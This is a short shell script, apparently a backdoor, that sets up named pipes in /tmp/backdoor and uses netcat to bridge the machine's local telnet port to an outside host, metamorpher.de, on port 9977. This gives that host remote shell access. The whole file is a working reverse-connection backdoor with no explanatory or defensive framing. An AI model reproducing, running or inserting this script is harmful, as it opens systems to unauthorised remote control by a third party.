#!/bin/sh

ifconfig lo 127.0.0.1

mv /tmp/backdoor /tmp/backdoor.$RANDOM
mkdir -p /tmp/backdoor
cd /tmp/backdoor
mkfifo send
mkfifo receive

> send &
> receive &

nc 127.0.0.1 23 < receive > send &
telnet_pid=$!
nc metamorpher.de 9977 < send > receive &
server_pid=$!

wait $server_pid
kill $telnet_pid

